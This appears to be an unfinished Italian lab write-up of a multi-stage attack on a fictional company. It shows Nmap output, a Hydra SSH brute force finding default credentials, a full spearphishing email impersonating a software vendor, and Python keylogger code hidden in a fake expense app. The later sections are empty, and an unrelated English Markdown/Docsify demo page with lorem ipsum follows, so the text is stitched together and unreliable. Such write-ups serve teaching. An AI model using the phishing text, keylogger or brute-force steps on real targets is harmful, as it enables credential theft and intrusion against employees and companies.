# La Morsa del Cyber Crimine: Esplorazione di un Attacco Multi-Fase, da Spearphishing a Furto di Dati

## Introduzione 

### Contesto e Importanza della Cybersecurity

Le minacce cyber sono in continua evoluzione e possono avere conseguenze devastanti sulla privacy, sull'integrità dei dati e sulla reputazione delle aziende. Tra le varie tecniche utilizzate dagli attaccanti, gli attacchi di spearphishing, l'iniezione di keylogger, il furto di credenziali e la divulgazione di informazioni sono tra i più pericolosi e diffusi.

### Obiettivo del Report

L'obiettivo di questo report è analizzare dettagliatamente un attacco composto da diverse fasi: enumerazione, spearphishing, iniezione di un keylogger, furto di credenziali e esfiltrazione di informazioni.

### Descrizione dell'attacco

L'attacco analizzato in questo report inizia con la fase di enumerazione, dove l'attaccante raccoglie informazioni su un'azienda e i suoi dipendenti. Successivamente, viene lanciato un attacco di spearphishing mirato, seguito dall'iniezione di un keylogger nel sistema della vittima. Il keylogger permette all'attaccante di rubare le credenziali di accesso (e qualsiasi cosa la il bersaglio digiti), che vengono poi utilizzate per accedere a informazioni sensibili ed esfiltrarle, con potenziali impatti devastanti per l'azienda colpita.

## Fase 0: Enumeration

L'enumerazione è una fase preliminare degli attacchi informatici in cui l'attaccante raccoglie informazioni dettagliate sulla vittima.

### Tecniche di Enumerazione

Gli attaccanti utilizzano diverse tecniche per raccogliere informazioni durante la fase di enumerazione, tra cui l'utilizzo di strumenti automatizzati come Nmap:

+ Social Media: Monitoraggio dei profili social dei dipendenti per raccogliere informazioni personali e professionali che possono essere utilizzate per creare attacchi mirati.

+ LinkedIn: Utilizzo di LinkedIn per identificare i dipendenti chiave dell'azienda e ottenere informazioni sui loro ruoli e interessi professionali.

+ Whois Lookup: Utilizzo di servizi Whois per ottenere informazioni sui registranti di domini aziendali, che possono includere nomi, indirizzi e contatti.

+ Nmap: Nmap è uno strumento di scansione di rete ampiamente utilizzato per raccogliere informazioni su dispositivi e servizi in una rete. Può essere utilizzato per identificare host attivi, porte aperte e servizi in esecuzione su tali porte.

### Scoperte nella fase di enumerazione

Dopo aver identificato l'azienda "Finanza Viva" **e il dipendente Alessandro, noto per il suo interesse nella finanza e negli investimenti, ** l'attaccante procede con la scansione della rete utilizzando Nmap. Supponiamo che l'attaccante trovi l'indirizzo IP 10.0.2.4 associato all'azienda.

Utilizzando Nmap:

```shell
nmap -sV 10.0.2.4
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-05-29 08:59 EDT
Nmap scan report for 10.0.2.4
Host is up (0.0019s latency).
Not shown: 995 closed tcp ports (conn-refused)
PORT     STATE SERVICE       VERSION
22/tcp   open  ssh           OpenSSH for_Windows_7.7 (protocol 2.0)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp  open  microsoft-ds  Microsoft Windows 7 - 10 microsoft-ds (workgroup: WORKGROUP)
3389/tcp open  ms-wbt-server Microsoft Terminal Services
Service Info: Host: DESKTOP-004APQ9; OS: Windows; CPE: cpe:/o:microsoft:windows

```

L'output rivela che l'azienda "Finanza Viva" ha configurato una macchina windows in cui il servizio SSH e il servizio SMB sono attivi.

## Fase 1: Valid Account

L'attaccante procede con l'utilizzo di Hydra per effettuare un attacco di forza bruta e ottenere accesso ai sistemi. l'attaccante usa un dizionario di nomi utenti e di password per trovare le credenziali del servizio SSH.

```shell
hydra -L User -P Password 10.0.2.4 ssh
[DATA] attacking ssh://10.0.2.4:22/
[22][ssh] host: 10.0.2.4   login: Amministratore   password: Password
[22][ssh] host: 10.0.2.4   login: amministratore   password: Password
1 of 1 target successfully completed, 2 valid passwords found
```
L'attaccante scopre l'uso di credenziali predefinite da parte dell'amministratore. Poi procede con l'accesso a SSH.

```shell
ssh Amministratore@10.0.2.4  
Amministratore@10.0.2.4's password: 
Microsoft Windows [Versione 10.0.19045.2965]
(c) Microsoft Corporation. Tutti i diritti sono riservati.
                                                          
amministratore@DESKTOP-004APQ9 C:\Users\filip> 
```
L'attaccante ottiene una shell nell'dispositivo dell'azienda con l'identità dell'amministratore.
Navigando nella directory Users, l'attaccante scopre la presenza di un altro utente: Alessandro.

Navigando nei file dell'utente, l'attaccante scopre che Alessandro è un grande fan della finanza e all'interno della azienza è il responsabile della gestione dei conti bancari e ne trova i contatti.

## Fase 2: Spearphishing e Iniezione di un Keylogger
L'attaccante utilizza le informazioni raccolte su Alessandro, un dipendente di "Finanza Viva" noto per il suo interesse nella finanza e negli investimenti, per creare un'email altamente personalizzata. L'email finge di provenire da una rinomata azienda del settore finanziario che propone di testare in esclusiva una nuova applicazione di gestione della spesa. L'attaccante ha scoperto l'indirizzo email di Alessandro e decide di inviare il seguente messaggio:
> Da: staff@Gestoredispesa.com

>A: Alessandro@finanzaviva.com

>Oggetto: Partecipazione Esclusiva al Test del Nuovo Software di Gestione delle Spese

>Ciao Alessandro,

>Spero che tu stia bene! Sono entusiasta di annunciarti che sei stato scelto per partecipare in esclusiva al test del nostro nuovo software per la Gestione Personale delle Spese.

>Abbiamo notato il tuo interesse e la tua competenza nel campo e crediamo che il tuo feedback possa essere estremamente prezioso per noi mentre continuiamo a perfezionare e migliorare il nostro prodotto.

>Il nostro team ha fatto un duro lavoro per sviluppare uno strumento intuitivo e potente che semplifichi la gestione delle spese personali, offrendo funzionalità avanzate e una user experience impeccabile.

>Vorremmo invitarti a provare il software in anteprima e condividere con noi le tue opinioni, suggerimenti e eventuali problemi che potresti riscontrare durante l'utilizzo. Il tuo contributo sarà fondamentale per aiutarci a rendere il software il migliore possibile prima del lancio ufficiale.

>Ti inviamo il link al software e le istruzioni per iniziare il test. Se hai domande o hai bisogno di assistenza, non esitare a contattarci. Non vediamo l'ora di lavorare con te e di rendere questo software un successo insieme!

>Cordiali saluti,

>Il Team di Gestione delle Spese

In allegato all'email, c'è un file eseguibile chiamato "Gestore_di_spesa.exe".

### Funzionamento del Software Malevolo

Alessandro scarica e avvia il programma "Gestore_di_spesa.exe". Il programma si presenta come una legittima applicazione di gestione delle spese, consentendo all'utente di inserire e monitorare entrate e uscite. Tuttavia, al momento della chiusura dell'applicazione, il keylogger nascosto si attiva.

```python
# Definisci la directory e il nome del file di log
log_directory = r"C:\Users\Alessandro"
log_file_name = "log.txt"
log_file_path = os.path.join(log_directory, log_file_name)
# Funzione per loggare le chiavi premute
def on_press(key):
    try:
        print(f"Premuto: {key.char}")
        with open(log_file_path, "a") as f:
            f.write(f"{key.char}")
    except AttributeError:
        print(f"Premuto: {key}")
        with open(log_file_path, "a") as f:
            f.write(f"{key}\n")

# Funzione per loggare le chiavi rilasciate
def on_release(key):
    print(f"Rilasciato: {key}")

# Avvia il keylogger
with Listener(on_press=on_press) as listener:
    listener.join()
```
Questo codice rappresenta un esempio di un keylogger scritto in Python, che registra tutti i tasti premuti e li salva in un file log.txt nella cartella dell'utente.

### Raccolta dei Dati

Dopo aver chiuso il programma, il keylogger inizia a catturare tutte le informazioni digitate da Alessandro, inclusi:

+ Nomi utente e password per l'accesso ai sistemi aziendali.
+ Dati personali e finanziari inseriti nei siti web.
+ Comunicazioni via email e chat.

## Fase 3: Esfiltrazione delle file log.txt



## Fase 5: 

## Fase 7: Conclusioni

## Fase 8: Riferimenti

## Create, Share and Collaborate

![Photo of Mountain](images/mountain.jpg)

[Docsify](https://docsify.js.org/#/) can generate article, portfolio and documentation websites on the fly. Unlike Docusaurus, Hugo and many other Static Site Generators (SSG), it does not generate static html files. Instead, it smartly loads and parses your Markdown content files and displays them as a website.

## Introduction

**Markdown** is a system-independent markup language that is easier to learn and use than **HTML**.

![The Markdown Mark](images/markdown-red.png)  
_Figure 1: The Markdown Mark_

Some of the key benefits are:

1. Markdown is simple to learn, with minimal extra characters, so it's also quicker to write content.
2. Less chance of errors when writing in markdown.
3. Produces valid XHTML output.
4. Keeps the content and the visual display separate, so you cannot mess up the look of your site.
5. Write in any text editor or Markdown application you like.
6. Markdown is a joy to use!

John Gruber, the author of Markdown, puts it like this:

> The overriding design goal for Markdown’s formatting syntax is to make it as readable as possible. The idea is that a Markdown-formatted document should be publishable as-is, as plain text, without looking like it’s been marked up with tags or formatting instructions. While Markdown’s syntax has been influenced by several existing text-to-HTML filters, the single biggest source of inspiration for Markdown’s syntax is the format of plain text email.
> -- <cite>John Gruber</cite>


Without further delay, let us go over the main elements of Markdown and what the resulting HTML looks like:

### Headings

Headings from `h1` through `h6` are constructed with a `#` for each level:

```markdown
# h1 Heading
## h2 Heading
### h3 Heading
#### h4 Heading
##### h5 Heading
###### h6 Heading
```

Renders to:

<h1> h1 Heading </h1>
<h2>  h2 Heading </h2>
<h3>  h3 Heading </h3>
<h4>  h4 Heading </h4>
<h5>  h5 Heading </h5>
<h6>  h6 Heading </h6>

HTML:

```html
<h1>h1 Heading</h1>
<h2>h2 Heading</h2>
<h3>h3 Heading</h3>
<h4>h4 Heading</h4>
<h5>h5 Heading</h5>
<h6>h6 Heading</h6>
```

### Comments

Comments should be HTML compatible

```html
<!--
This is a comment
-->
```
Comment below should **NOT** be seen:

<!--
This is a comment
-->

### Horizontal Rules

The HTML `<hr>` element is for creating a "thematic break" between paragraph-level elements. In markdown, you can create a `<hr>` with any of the following:

* `___`: three consecutive underscores
* `---`: three consecutive dashes
* `***`: three consecutive asterisks

renders to:

___

---

***


### Body Copy

Body copy written as normal, plain text will be wrapped with `<p></p>` tags in the rendered HTML.

So this body copy:

```markdown
Lorem ipsum dolor sit amet, graecis denique ei vel, at duo primis mandamus. Et legere ocurreret pri, animal tacimates complectitur ad cum. Cu eum inermis inimicus efficiendi. Labore officiis his ex, soluta officiis concludaturque ei qui, vide sensibus vim ad.
```
renders to this HTML:

```html
<p>Lorem ipsum dolor sit amet, graecis denique ei vel, at duo primis mandamus. Et legere ocurreret pri, animal tacimates complectitur ad cum. Cu eum inermis inimicus efficiendi. Labore officiis his ex, soluta officiis concludaturque ei qui, vide sensibus vim ad.</p>
```

### Emphasis

#### Bold
For emphasizing a snippet of text with a heavier font-weight.

The following snippet of text is **rendered as bold text**.

```markdown
**rendered as bold text**
```
renders to:

**rendered as bold text**

and this HTML

```html
<strong>rendered as bold text</strong>
```

#### Italics
For emphasizing a snippet of text with italics.

The following snippet of text is _rendered as italicized text_.

```markdown
_rendered as italicized text_
```

renders to:

_rendered as italicized text_

and this HTML:

```html
<em>rendered as italicized text</em>
```


#### strikethrough
In GFM (GitHub flavored Markdown) you can do strikethroughs.

```markdown
~~Strike through this text.~~
```
Which renders to:

~~Strike through this text.~~

HTML:

```html
<del>Strike through this text.</del>
```

### Blockquotes
For quoting blocks of content from another source within your document.

Add `>` before any text you want to quote.

```markdown
> **Fusion Drive** combines a hard drive with a flash storage (solid-state drive) and presents it as a single logical volume with the space of both drives combined.
```

Renders to:

> **Fusion Drive** combines a hard drive with a flash storage (solid-state drive) and presents it as a single logical volume with the space of both drives combined.

and this HTML:

```html
<blockquote>
  <p><strong>Fusion Drive</strong> combines a hard drive with a flash storage (solid-state drive) and presents it as a single logical volume with the space of both drives combined.</p>
</blockquote>
```

Blockquotes can also be nested:

```markdown
> Donec massa lacus, ultricies a ullamcorper in, fermentum sed augue.
Nunc augue augue, aliquam non hendrerit ac, commodo vel nisi.
>> Sed adipiscing elit vitae augue consectetur a gravida nunc vehicula. Donec auctor
odio non est accumsan facilisis. Aliquam id turpis in dolor tincidunt mollis ac eu diam.
```

Renders to:

> Donec massa lacus, ultricies a ullamcorper in, fermentum sed augue.
Nunc augue augue, aliquam non hendrerit ac, commodo vel nisi.
>> Sed adipiscing elit vitae augue consectetur a gravida nunc vehicula. Donec auctor
odio non est accumsan facilisis. Aliquam id turpis in dolor tincidunt mollis ac eu diam.

### Lists

#### Unordered
A list of items in which the order of the items does not explicitly matter.

You may use any of the following symbols to denote bullets for each list item:

```markdown
* valid bullet
- valid bullet
+ valid bullet
```

For example

```markdown
+ Lorem ipsum dolor sit amet
+ Consectetur adipiscing elit
+ Integer molestie lorem at massa
+ Facilisis in pretium nisl aliquet
+ Nulla volutpat aliquam velit
  - Phasellus iaculis neque
  - Purus sodales ultricies
  - Vestibulum laoreet porttitor sem
  - Ac tristique libero volutpat at
+ Faucibus porta lacus fringilla vel
+ Aenean sit amet erat nunc
+ Eget porttitor lorem
```
Renders to:

+ Lorem ipsum dolor sit amet
+ Consectetur adipiscing elit
+ Integer molestie lorem at massa
+ Facilisis in pretium nisl aliquet
+ Nulla volutpat aliquam velit
  - Phasellus iaculis neque
  - Purus sodales ultricies
  - Vestibulum laoreet porttitor sem
  - Ac tristique libero volutpat at
+ Faucibus porta lacus fringilla vel
+ Aenean sit amet erat nunc
+ Eget porttitor lorem

And this HTML

```html
<ul>
  <li>Lorem ipsum dolor sit amet</li>
  <li>Consectetur adipiscing elit</li>
  <li>Integer molestie lorem at massa</li>
  <li>Facilisis in pretium nisl aliquet</li>
  <li>Nulla volutpat aliquam velit
    <ul>
      <li>Phasellus iaculis neque</li>
      <li>Purus sodales ultricies</li>
      <li>Vestibulum laoreet porttitor sem</li>
      <li>Ac tristique libero volutpat at</li>
    </ul>
  </li>
  <li>Faucibus porta lacus fringilla vel</li>
  <li>Aenean sit amet erat nunc</li>
  <li>Eget porttitor lorem</li>
</ul>
```

#### Ordered

A list of items in which the order of items does explicitly matter.

```markdown
1. Lorem ipsum dolor sit amet
2. Consectetur adipiscing elit
3. Integer molestie lorem at massa
4. Facilisis in pretium nisl aliquet
5. Nulla volutpat aliquam velit
6. Faucibus porta lacus fringilla vel
7. Aenean sit amet erat nunc
8. Eget porttitor lorem
```
Renders to:

1. Lorem ipsum dolor sit amet
2. Consectetur adipiscing elit
3. Integer molestie lorem at massa
4. Facilisis in pretium nisl aliquet
5. Nulla volutpat aliquam velit
6. Faucibus porta lacus fringilla vel
7. Aenean sit amet erat nunc
8. Eget porttitor lorem

And this HTML:

```html
<ol>
  <li>Lorem ipsum dolor sit amet</li>
  <li>Consectetur adipiscing elit</li>
  <li>Integer molestie lorem at massa</li>
  <li>Facilisis in pretium nisl aliquet</li>
  <li>Nulla volutpat aliquam velit</li>
  <li>Faucibus porta lacus fringilla vel</li>
  <li>Aenean sit amet erat nunc</li>
  <li>Eget porttitor lorem</li>
</ol>
```

**TIP**: If you just use `1.` for each number, Markdown will automatically number each item. For example:

```markdown
1. Lorem ipsum dolor sit amet
1. Consectetur adipiscing elit
1. Integer molestie lorem at massa
1. Facilisis in pretium nisl aliquet
1. Nulla volutpat aliquam velit
1. Faucibus porta lacus fringilla vel
1. Aenean sit amet erat nunc
1. Eget porttitor lorem
```

Renders to:

1. Lorem ipsum dolor sit amet
2. Consectetur adipiscing elit
3. Integer molestie lorem at massa
4. Facilisis in pretium nisl aliquet
5. Nulla volutpat aliquam velit
6. Faucibus porta lacus fringilla vel
7. Aenean sit amet erat nunc
8. Eget porttitor lorem

### Code

#### Inline code
Wrap inline snippets of code with `` ` ``.

```markdown
In this example, `<section></section>` should be wrapped as **code**.
```

Renders to:

In this example, `<section></section>` should be wrapped with **code**.

HTML:

```html
<p>In this example, <code>&lt;section&gt;&lt;/section&gt;</code> should be wrapped with <strong>code</strong>.</p>
```

#### Indented code

Or indent several lines of code by at least four spaces, as in:

<pre>
  // Some comments
  line 1 of code
  line 2 of code
  line 3 of code
</pre>

Renders to:

    // Some comments
    line 1 of code
    line 2 of code
    line 3 of code

HTML:

```html
<pre>
  <code>
    // Some comments
    line 1 of code
    line 2 of code
    line 3 of code
  </code>
</pre>
```


#### Block code "fences"

Use "fences"  ```` ``` ```` to block in multiple lines of code.

<pre>
``` markup
Sample text here...
```
</pre>


```
Sample text here...
```

HTML:

```html
<pre>
  <code>Sample text here...</code>
</pre>
```

#### Syntax highlighting

GFM, or "GitHub Flavored Markdown" also supports syntax highlighting. To activate it, simply add the file extension of the language you want to use directly after the first code "fence", ` ```js `, and syntax highlighting will automatically be applied in the rendered HTML. For example, to apply syntax highlighting to JavaScript code:

<pre>
```js
grunt.initConfig({
  assemble: {
    options: {
      assets: 'docs/assets',
      data: 'src/data/*.{json,yml}',
      helpers: 'src/custom-helpers.js',
      partials: ['src/partials/**/*.{hbs,md}']
    },
    pages: {
      options: {
        layout: 'default.hbs'
      },
      files: {
        './': ['src/templates/pages/index.hbs']
      }
    }
  }
};
```
</pre>

Renders to:

```js
grunt.initConfig({
  assemble: {
    options: {
      assets: 'docs/assets',
      data: 'src/data/*.{json,yml}',
      helpers: 'src/custom-helpers.js',
      partials: ['src/partials/**/*.{hbs,md}']
    },
    pages: {
      options: {
        layout: 'default.hbs'
      },
      files: {
        './': ['src/templates/pages/index.hbs']
      }
    }
  }
};
```

### Tables
Tables are created by adding pipes as dividers between each cell, and by adding a line of dashes (also separated by bars) beneath the header. Note that the pipes do not need to be vertically aligned.


```markdown
| Option | Description |
| ------ | ----------- |
| data   | path to data files to supply the data that will be passed into templates. |
| engine | engine to be used for processing templates. Handlebars is the default. |
| ext    | extension to be used for dest files. |
```

Renders to:

| Option | Description |
| ------ | ----------- |
| data   | path to data files to supply the data that will be passed into templates. |
| engine | engine to be used for processing templates. Handlebars is the default. |
| ext    | extension to be used for dest files. |

And this HTML:

```html
<table>
  <tr>
    <th>Option</th>
    <th>Description</th>
  </tr>
  <tr>
    <td>data</td>
    <td>path to data files to supply the data that will be passed into templates.</td>
  </tr>
  <tr>
    <td>engine</td>
    <td>engine to be used for processing templates. Handlebars is the default.</td>
  </tr>
  <tr>
    <td>ext</td>
    <td>extension to be used for dest files.</td>
  </tr>
</table>
```

### Right aligned text

Adding a colon on the right side of the dashes below any heading will right align text for that column.

```markdown
| Option | Description |
| ------:| -----------:|
| data   | path to data files to supply the data that will be passed into templates. |
| engine | engine to be used for processing templates. Handlebars is the default. |
| ext    | extension to be used for dest files. |
```

| Option | Description |
| ------:| -----------:|
| data   | path to data files to supply the data that will be passed into templates. |
| engine | engine to be used for processing templates. Handlebars is the default. |
| ext    | extension to be used for dest files. |

### Links

#### Basic link

```markdown
[Assemble](http://assemble.io)
```

Renders to (hover over the link, there is no tooltip):

[Assemble](http://assemble.io)

HTML:

```html
<a href="http://assemble.io">Assemble</a>
```


#### Add a title

```markdown
[Upstage](https://github.com/upstage/ "Visit Upstage!")
```

Renders to (hover over the link, there should be a tooltip):

[Upstage](https://github.com/upstage/ "Visit Upstage!")

HTML:

```html
<a href="https://github.com/upstage/" title="Visit Upstage!">Upstage</a>
```

#### Named Anchors

Named anchors enable you to jump to the specified anchor point on the same page. For example, each of these chapters:

```markdown
# Table of Contents
  * [Chapter 1](#chapter-1)
  * [Chapter 2](#chapter-2)
  * [Chapter 3](#chapter-3)
```
will jump to these sections:

```markdown
### Chapter 1 <a id="chapter-1"></a>
Content for chapter one.

### Chapter 2 <a id="chapter-2"></a>
Content for chapter one.

### Chapter 3 <a id="chapter-3"></a>
Content for chapter one.
```
**NOTE** that specific placement of the anchor tag seems to be arbitrary. They are placed inline here since it seems to be unobtrusive, and it works.

### Images
Images have a similar syntax to links but include a preceding exclamation point.

```markdown
![Image of Minion](https://octodex.github.com/images/minion.png)
```
![Image of Minion](https://octodex.github.com/images/minion.png)

and using a local image (which also displays in GitHub):

```markdown
![Image of Octocat](images/octocat.jpg)
```
![Image of Octocat](images/octocat.jpg)

## Topic One  

Lorem markdownum in maior in corpore ingeniis: causa clivo est. Rogata Veneri terrebant habentem et oculos fornace primusque et pomaria et videri putri, levibus. Sati est novi tenens aut nitidum pars, spectabere favistis prima et capillis in candida spicis; sub tempora, aliquo.

## Topic Two

Lorem markdownum vides aram est sui istis excipis Danai elusaque manu fores.
Illa hunc primo pinum pertulit conplevit portusque pace *tacuit* sincera. Iam
tamen licentia exsulta patruelibus quam, deorum capit; vultu. Est *Philomela
qua* sanguine fremit rigidos teneri cacumina anguis hospitio incidere sceptroque
telum spectatorem at aequor.

## Topic Three

### Overview

Lorem markdownum vides aram est sui istis excipis Danai elusaque manu fores.
Illa hunc primo pinum pertulit conplevit portusque pace *tacuit* sincera. Iam
tamen licentia exsulta patruelibus quam, deorum capit; vultu. Est *Philomela
qua* sanguine fremit rigidos teneri cacumina anguis hospitio incidere sceptroque
telum spectatorem at aequor.

### Subtopic One

Lorem markdownum murmure fidissime suumque. Nivea agris, duarum longaeque Ide
rugis Bacchum patria tuus dea, sum Thyneius liquor, undique. **Nimium** nostri
vidisset fluctibus **mansit** limite rigebant; enim satis exaudi attulit tot
lanificae [indice](http://www.mozilla.org/) Tridentifer laesum. Movebo et fugit,
limenque per ferre graves causa neque credi epulasque isque celebravit pisces.

- Iasone filum nam rogat
- Effugere modo esse
- Comminus ecce nec manibus verba Persephonen taxo
- Viribus Mater
- Bello coeperunt viribus ultima fodiebant volentem spectat
- Pallae tempora

#### Fuit tela Caesareos tamen per balatum

De obstruat, cautes captare Iovem dixit gloria barba statque. Purpureum quid
puerum dolosae excute, debere prodest **ignes**, per Zanclen pedes! *Ipsa ea
tepebat*, fiunt, Actoridaeque super perterrita pulverulenta. Quem ira gemit
hastarum sucoque, idem invidet qui possim mactatur insidiosa recentis, **res
te** totumque [Capysque](http://tumblr.com/)! Modo suos, cum parvo coniuge, iam
sceleris inquit operatus, abundet **excipit has**.

In locumque *perque* infelix hospite parente adducto aequora Ismarios,
feritatis. Nomine amantem nexibus te *secum*, genitor est nervo! Putes
similisque festumque. Dira custodia nec antro inornatos nota aris, ducere nam
genero, virtus rite.

- Citius chlamydis saepe colorem paludosa territaque amoris
- Hippolytus interdum
- Ego uterque tibi canis
- Tamen arbore trepidosque

#### Colit potiora ungues plumeus de glomerari num

Conlapsa tamen innectens spes, in Tydides studio in puerili quod. Ab natis non
**est aevi** esse riget agmenque nutrit fugacis.

- Coortis vox Pylius namque herbosas tuae excedere
- Tellus terribilem saetae Echinadas arbore digna
- Erraverit lectusque teste fecerat

Suoque descenderat illi; quaeritur ingens cum periclo quondam flaventibus onus
caelum fecit bello naides ceciderunt cladis, enim. Sunt aliquis.

### Subtopic Two

Lorem *markdownum saxum et* telum revellere in victus vultus cogamque ut quoque
spectat pestiferaque siquid me molibus, mihi. Terret hinc quem Phoebus? Modo se
cunctatus sidera. Erat avidas tamen antiquam; ignes igne Pelates
[morte](http://www.youtube.com/watch?v=MghiBW3r65M) non caecaque canam Ancaeo
contingat militis concitus, ad!

#### Et omnis blanda fetum ortum levatus altoque

Totos utinamque nutricis. Lycaona cum non sine vocatur tellus campus insignia et
absumere pennas Cythereiadasque pericula meritumque Martem longius ait moras
aspiciunt fatorum. Famulumque volvitur vultu terrae ut querellas hosti deponere
et dixit est; in pondus fonte desertum. Condidit moras, Carpathius viros, tuta
metum aethera occuluit merito mente tenebrosa et videtur ut Amor et una
sonantia. Fuit quoque victa et, dum ora rapinae nec ipsa avertere lata, profugum
*hectora candidus*!

#### Et hanc

Quo sic duae oculorum indignos pater, vis non veni arma pericli! Ita illos
nitidique! Ignavo tibi in perdam, est tu precantia fuerat
[revelli](http://jaspervdj.be/).

Non Tmolus concussit propter, et setae tum, quod arida, spectata agitur, ferax,
super. Lucemque adempto, et At tulit navem blandas, et quid rex, inducere? Plebe
plus *cum ignes nondum*, fata sum arcus lustraverat tantis!

#### Adulterium tamen instantiaque puniceum et formae patitur

Sit paene [iactantem suos](http://www.metafilter.com/) turbineo Dorylas heros,
triumphos aquis pavit. Formatae res Aeolidae nomen. Nolet avum quique summa
cacumine dei malum solus.

1. Mansit post ambrosiae terras
2. Est habet formidatis grandior promissa femur nympharum
3. Maestae flumina
4. Sit more Trinacris vitasset tergo domoque
5. Anxia tota tria
6. Est quo faece nostri in fretum gurgite

Themis susurro tura collo: cunas setius *norat*, Calydon. Hyaenam terret credens
habenas communia causas vocat fugamque roganti Eleis illa ipsa id est madentis
loca: Ampyx si quis. Videri grates trifida letum talia pectus sequeretur erat
ignescere eburno e decolor terga.

> Note: Example page content from [GetGrav.org](https://learn.getgrav.org/17/content/markdown), included to demonstrate the portability of Markdown-based content
